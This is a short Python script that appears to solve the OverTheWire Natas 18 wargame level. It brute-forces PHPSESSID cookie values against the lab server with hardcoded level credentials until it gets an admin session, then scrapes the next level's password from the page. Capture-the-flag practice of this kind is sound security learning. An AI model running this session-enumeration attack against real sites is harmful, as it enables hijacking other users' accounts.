#!/usr/bin/env python3

import requests
import re
import string
from time import *

req = requests.Session()

s= string.ascii_letters+string.digits

username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
url = "http://%s.natas.labs.overthewire.org/" % username


for i in range(1,641):
	print("Trying...",i)
	req_get = req.get(url,cookies={"PHPSESSID":str(i)},auth=(username,password))
	if "You are an admin" in req_get.text:
		content = req_get.text
		print("Correct PHPSESSID: ",i)
		break

new_password = re.findall("Password: (.*)</pre>",content)
print(new_password[0])

# PHPSESSID = 119